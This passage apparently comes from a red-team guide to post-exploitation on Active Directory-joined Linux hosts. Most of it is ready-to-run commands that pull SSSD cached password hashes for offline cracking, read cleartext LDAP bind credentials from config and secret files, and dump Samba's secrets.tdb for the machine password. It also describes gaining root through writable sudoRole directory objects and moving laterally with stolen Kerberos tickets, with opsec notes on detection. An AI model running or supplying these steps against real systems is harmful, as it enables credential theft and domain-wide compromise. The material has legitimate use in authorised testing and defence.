**Why it works.** With `cache_credentials = true` (which `realm join` sets by default), SSSD stores a hash of each successful authenticator in its local LDB database. Historically that was a plain SHA-512 crypt; current versions use a PBKDF2-SHA512 derivation with a configurable iteration count. Either way it is an offline-crackable verifier for a domain account, and on a host used by administrators it is a domain administrator's password verifier.

```bash
grep -E 'cache_credentials|krb5_store_password_if_offline' /etc/sssd/sssd.conf
ls -la /var/lib/sss/db/
# the cache is an LDB database, one per domain
ldbsearch -H /var/lib/sss/db/cache_$DOMAIN.ldb 'cachedPassword=*' name cachedPassword 2>/dev/null
# without ldbsearch, strings gets you most of the way
strings /var/lib/sss/db/cache_$DOMAIN.ldb | grep -iE '\$6\$|\$SSSD|cachedPassword' | head
# krb5_store_password_if_offline stores the actual password, encrypted, for offline kinit
ls -la /var/lib/sss/secrets/
```

Crack the extracted verifier as a standard crypt hash. `$6$` prefixed values are sha512crypt, which is hashcat mode 1800 and John's `sha512crypt` format. Where SSSD has been configured to store a PBKDF2-SHA512 verifier instead of a crypt string there is no SSSD-specific mode in either tool: strip the value down to salt, iteration count and derived key and run it as a generic PBKDF2-HMAC-SHA512 (hashcat mode 12100, John's `PBKDF2-HMAC-SHA512` format). Check the prefix on the value you actually recovered before choosing.

Also read `sssd.conf` itself for a bind credential, which is a plain domain credential sitting in a file:

```bash
grep -iE 'ldap_default_bind_dn|ldap_default_authtok|ad_domain|ldap_uri|ldap_sasl_authid' /etc/sssd/sssd.conf /etc/sssd/conf.d/* 2>/dev/null
cat /etc/nslcd.conf /etc/ldap.conf /etc/openldap/ldap.conf /etc/pam_ldap.conf 2>/dev/null | grep -iE 'binddn|bindpw|rootbinddn|uri'
cat /etc/ldap.secret /etc/nslcd.secret 2>/dev/null
```

`ldap_default_authtok` in `sssd.conf` and `bindpw` in `nslcd.conf` are cleartext domain credentials. They are often a dedicated read-only account, and they are often not, and either way they give you authenticated LDAP for enumeration.

#### Samba's machine secret

For a winbind-joined host, the machine account key is in Samba's `secrets.tdb` rather than a keytab:

```bash
ls -la /var/lib/samba/private/secrets.tdb /var/lib/samba/secrets.tdb 2>/dev/null
tdbdump /var/lib/samba/private/secrets.tdb 2>/dev/null | grep -iA2 'SECRETS/MACHINE'
net getlocalsid; net ads info
# machine account password, usable as a credential for the computer object
net changesecretpw -f 2>/dev/null       # do not run this: it rotates the key and breaks the join
```

`tdbdump` output includes `SECRETS/MACHINE_PASSWORD/<DOMAIN>` (the cleartext machine password) and `SECRETS/MACHINE_LAST_CHANGE_TIME`. That cleartext password is directly usable as the computer account's credential.

#### sudo policy stored in the directory

**Why it matters.** With `sudoers: files sss` in `/etc/nsswitch.conf`, sudo rules come from AD `sudoRole` objects under a configurable search base. That means two things. First, `sudo -l` is the only reliable way to see the policy. Second, if you have directory write access to those objects from the Windows side, you can grant yourself root on every Linux host in scope without touching any of them, and the change is an LDAP write rather than a file modification on a monitored host.

```bash
grep sudoers /etc/nsswitch.conf
grep -iE 'sudo_provider|ldap_sudo|sudo' /etc/sssd/sssd.conf 2>/dev/null
sudo -l
ls -la /var/lib/sss/db/cache_*.ldb        # sudo rules are cached here too
ldbsearch -H /var/lib/sss/db/cache_$DOMAIN.ldb '(objectClass=sudoRule)' 2>/dev/null
# from a domain-authenticated context, read the rules directly
ldapsearch -Y GSSAPI -H ldap://$DC -b 'OU=sudoers,DC=corp,DC=local' '(objectClass=sudoRole)' 2>/dev/null
```

Enumerating `sudoRole` objects and their ACLs is a BloodHound-adjacent exercise and belongs in your directory analysis, not just your host analysis. An `OU` containing sudo rules with write access granted to a helpdesk group is an escalation path from a low-privileged domain user to root on every Linux server.

#### Kerberos-based lateral movement from the Linux host

Once you hold a keytab or a ccache, the Linux host is a first-class Kerberos client and you do not need to move to Windows tooling:

```bash
export KRB5CCNAME=/dev/shm/.cc
kinit user@REALM.COM                            # note: realm uppercase, and DNS must resolve the KDC
klist
# SSH with GSSAPI to any host trusting the realm
ssh -K -o GSSAPIAuthentication=yes $TARGET
# SMB
smbclient -k //$TARGET/C$
nxc smb $TARGETS -k --use-kcache
# LDAP and directory tooling
ldapsearch -Y GSSAPI -H ldap://$DC -b "DC=${DOMAIN//./,DC=}" '(objectClass=computer)' dNSHostName
bloodyAD -k --host $DC -d $DOMAIN get all
certipy find -k -no-pass -target $DC -vulnerable -stdout
```

**Kerberos on Linux is intolerant of DNS and clock problems**, more so than on Windows. SPN lookup uses forward and reverse DNS, so a host that resolves by IP but not by name fails with confusing errors. Clock skew beyond the KDC's tolerance (five minutes by default) fails every request. Realm names are case sensitive by convention and are uppercase.

```bash
timedatectl status; chronyc tracking 2>/dev/null; ntpq -p 2>/dev/null
dig +short $DC; dig +short -x $(dig +short $DC)
dig +short _kerberos._tcp.$DOMAIN SRV
KRB5_TRACE=/dev/stderr kinit user@REALM.COM      # verbose trace, invaluable for diagnosing
```

`KRB5_TRACE=/dev/stderr` is the single most useful debugging tool here and almost nobody uses it. It prints every KDC request, the encryption types offered, the realm resolution, and the exact failure.

**Detection and opsec.** Kerberos activity from a Linux host is logged on the domain controller exactly as it is from a Windows host: 4768 for TGT requests, 4769 for service tickets, 4771 for pre-authentication failures. A `kinit` with a keytab produces a 4768 with an encryption type and a client address, and a machine account requesting tickets for services it has never touched is anomalous. Using a stolen ccache from a different source host produces 4769 events for the victim user from an unexpected address, which is one of the more reliably detected patterns in a mature environment. `KRB5_TRACE` writes nothing remotely.
